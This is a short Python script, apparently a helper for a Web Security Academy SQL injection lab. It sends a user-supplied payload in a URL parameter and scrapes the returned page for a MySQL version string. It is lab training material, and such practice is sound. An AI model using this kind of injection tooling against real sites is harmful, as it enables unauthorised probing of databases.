import requests
from bs4 import BeautifulSoup
import re
import sys

#url - https://LAB-ID.web-security-academy.net/filter?category=Gifts

try:
	url = input("Enter the URL: ")
	parameter = input("Enter parameter: ")
	payload = input("Enter payload: ")

	headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

	full_url = f"{url}?{parameter}={payload}"
	#print(full_url)

	#Make a web request using the request library
	response = requests.get(full_url, headers=headers)
	#print(response.text)

	#Use Beautifulsoup library to parse the HTML Content(response) 
	soup = BeautifulSoup(response.text, 'html.parser')
	#print(soup)

	#Find the tbody tag
	tbody_tag = soup.find('tbody')
	#print(tbody_tag)

	#Extract and print the text inside the tbody tag if found
	if tbody_tag:
		tbody_text = tbody_tag.get_text(separator='\n', strip=True)
		#print(tbody_text)

		#Extracting version using regular expression 8.0.36-0ubuntu0.20.04.1
		pattern = r'\d.\d.\d..\dubuntu.*'
		matches = re.findall(pattern, tbody_text)

		if matches:
			for match in matches:
				print(match)
		else:
			print("MySQL Version not found")
	else:
		print("Lab not solved")


except requests.exceptions.RequestException as e:
	print(f"An Error has occured please check your connection: ")
except KeyboardInterrupt:
	print("\nProgram Interrupted by user: ")
	sys.exit()